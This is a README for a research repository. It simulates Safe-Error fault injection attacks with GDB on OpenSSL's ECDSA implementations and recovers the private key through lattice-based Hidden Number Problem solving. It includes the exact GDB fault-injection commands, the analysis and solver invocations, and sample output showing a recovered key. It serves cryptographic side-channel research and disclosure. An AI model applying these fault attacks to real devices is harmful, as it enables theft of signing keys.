# Safe-Error Simulations with GDB on ECC in OpenSSL

This repository presents two Safe-Error fault injection attacks on two implementations of the elliptic curve scalar multiplication in OpenSSL.

This is an extension of the work presented at the [SSTIC 2020 conference](https://www.sstic.org/2020/presentation/exploiting_dummy_codes_in_elliptic_curve_cryptography_implementations/) with the original PoC in https://github.com/orangecertcc/ecdummy.
The two major updates are:

* the attack on the efficient window-based scalar multiplication of the elliptic curve `secp256r1` is remade using GDB, the GNU debugger software;
* the Safe-Error attack is also applied on the Montgomery ladder scalar multiplication of OpenSSL.

This work is licensed under the terms of [GNU General Public License v3](https://www.gnu.org/licenses/gpl-3.0.en.html).


## Requirements

The simulation is done with GDB, the GNU debugger, with a program compiled on a Raspberry Pi device, model 4B.
So the GDB scripts might not be compatible with a different setup and it might be necessary to modify the addresses of the faulted instructions.

The private key recovery has a dependency on `fpylll`.
We refer to [https://github.com/fplll/fpylll](https://github.com/fplll/fpylll) for installation of `fpylll` or use a [docker image](https://hub.docker.com/r/fplll/fpylll) for simplicity.


## Content

This repository contains several files used for the simulations aranged in the following folders.

* `binary/`: contains a simple program to be linked to OpenSSL at compilation. It generates ECDSA signatures and appends them to a file;
* `py/`: Python scripts for the analysis of signatures and recovering the private key;
  * `ec.py`: Python implementation of elliptic curves (no dependencies), mainly used to verify signatures and that the recovered private key is correct;
  * `safeerror_analysis.py`: analyzes the signatures and prepares a file for private key recovery;
  * `solve_hnp.py`: solves the Hidden Number Problem with lattices and recover the private key from the results of the analysis made by the previous script;
* `safeerror_wbooth/`: files for the simulation on the efficient window based scalar multiplication of the elliptic curve `secp256r1` in OpenSSL;
* `safeerror_ladder/`: files for the simulation on the Montgomery ladder scalar multiplication of OpenSSL (using the elliptic curve `secp256k1`).


## Program Compilation

This has only been tested on a Raspberry Pi 4B, with the latest Raspberry Pi OS Lite (formerly known as Raspbian) as of 2021.

It is compiled with the following command so it is linked to the OpenSSL cryptographic library `libcrypto`:

```
gcc main.c -lcrypto -o ecdsasign
```

This program takes as input an elliptic curve private key in a PEM format, a message to sign and a file where the signature is appended:

```
./ecdsasign privkey.pem message.txt sig.bin
```

It only runs what is necessary to produce an ECDSA signature which is appended to the file `sig.bin` given as input.


## Simulation 1: Safe-Error on Window-based Scalar Multiplication

The [original PoC](https://github.com/orangecertcc/ecdummy) presented the attack with an altered version of OpenSSL where the fault is manually written in the code.
Here, the fault is simulated using GDB with an arbitrary change in a modular multiplication.

We recall from the paper that the target is the last point addition of the scalar multiplication.
First, we put a breakpoint on the function `ecp_nistz256_point_add_affine` that is only effectice on the last call.
Then, we add a breakpoint on an instruction during the execution of the modular multiplication `ecp_nistz256_mul_mont`, followed by a modification of a register to simulate the fault.

The GDB instructions to achieve that are given below:

```
(gdb) b main
(gdb) r privkey_secp256r1.pem message.txt sig_safeerror_wbooth.bin
(gdb) b *0xb6e94540
(gdb) ignore 2 35
(gdb) c
(gdb) b *0xb6e935a0
(gdb) ignore 3 4
(gdb) c
(gdb) set $r3=0x55adab
(gdb) disable 3
(gdb) c
```

This process is automated with the script `simul_safeerror_wbooth.gdb` that generates 2000 signatures with such a fault made during the last point addition of the scalar multiplication.
It is executed with the following command (from the repository containing the script, the private key file and the message that is signed):

```
gdb ../binary/ecdsasign --command=simul_safeerror_wbooth.gdb
```


## Simulation 2: Safe-Error on the Montgomery Ladder Scalar Multiplication

On each step of the Montgomery ladder algorithm there is a point addition between two points `R0` and `R1` followed by a doubling of `Rb` where `b` is the current bit of the scalar; then the results of these operations replace the old values.
The output of the algorithm is the point in the variable `R0` once each bit of the secret scalar has been processed.

If the last bit is 0, then the result of the addition between `R0`and `R1` is stored on `R1` but it is not used to get the output of the algorithm.
Therefore this last point addition is dummy in this case.
This is also true if the last bits of the scalar are consecutive zeros so the last point additions become dummies.

This algorithm is the default in OpenSSL for most curves that do not have an optimized implementation (or if the optimization is disabled).
As such, we chose to present the attack with the `secp256k1` curve, with a target in the 253rd step of the algorithm so a fault that does not have an impact reveals that the last 4 bits of the scalar are zeros.

A breakpoint is put on the function `ec_GFp_simple_ladder_step` that processes a step of the algorithm (as the name suggests), by ignoring the first 252 calls.
Then, a breakpoint is added on an intrusction of the function `bn_mul8x_mont_neon`, followed by a register modification to simulate the fault.
An arbitrary choice is made so that it impacts the fifth modular multiplication on a ladder step.

The GDB instructions to achieve this are given below:

```
(gdb) b main
(gdb) r privkey_secp256k1.pem message.txt sig_safeerror_ladder.bin
(gdb) b *0xb6e9808c
(gdb) ignore 2 252
(gdb) c
(gdb) b *0xb6e0cf48
(gdb) ignore 3 4
(gdb) c
(gdb) set $q9.u64={0x55adab,0xc0ffee}
(gdb) disable 2
(gdb) disable 3
(gdb) c
```

This is automated in the script `simul_safeerror_ladder.gdb` that generates 1400 signatures with such a fault.
It is executed with the following command (from the folder that contains ):

```
gdb ../binary/ecdsasign --command=simul_safeerror_ladder.gdb
```


## Analysis and Private Key Recovery

Two scripts are provided: a first one for the analysis, and a second one for the private key recovery.


### Analysis

The analysis is done with the Python script `safeerror_analysis.py` which takes as input several arguments:

* `--curve`: name of the curve such as `secp256r1` or `secp256k1`;
* `--pubkey`: filename of the public key;
* `--sig`: filename of the file containing the signatures;
* `--msg`: filename of the message signed (unique for all signatures in this PoC);
* `--lsb`, `--msb` and `--ell`: indicate that either the least (`--lsb`) or the most (`--msb`) significant bits are set to 0; the number of those bits is given by the value following the option `--ell`;
* `--padding`: indicates that the nonce is padded with the group order (for Montgomery ladder for example); this option is not compatible with the option `--msb`;
* `--out`: filename where the results of the analysis are stored.

For example, for the first simulation the command is

```
python3 ../py/safeerror_analysis.py --curve secp256r1 --pubkey pubkey_secp256r1.pem --sig sig_safeerror_wbooth.bin --msg message.txt --msb --ell 5 --out results_safeerror_wbooth.txt
```

For the second simulation on Montgomery ladder, the command is

```
python3 ../py/safeerror_analysis.py --curve secp256k1 --pubkey pubkey_secp256k1.pem --sig sig_safeerror_ladder.bin --msg message.txt --lsb --ell 4 --padding --out results_safeerror_ladder.txt
```


### Private Key Recovery

The results stored on the output file of the first script define an instance of the Hidden Number Problem that is solved using lattices thanks to the second script.

The script is executed by the following command:

```
python3 ../py/solve_hnp.py results_safeerror_wbooth.txt
```

The output using the sample data provided in the folder:

```
Elliptic curve: secp256r1
    Public key: (0xbcffc6ff65f78a770f264e561e3fde75578694dba72d0ad0a2b3137b4e249047,
                 0x362937b3fa35c80165e611f0ca3bb27639d2a6ec4a42804aa39e0139388fef38)
HNP with 52 signatures...
HNP with 53 signatures...
HNP with 54 signatures...
HNP with 55 signatures...
Private key: 11510792401945587236512468312224202364397116824425737824991017224497705403905
```

With the sample from the simulation on Montgomery ladder, the private key is recovered from the first 69 signatures.
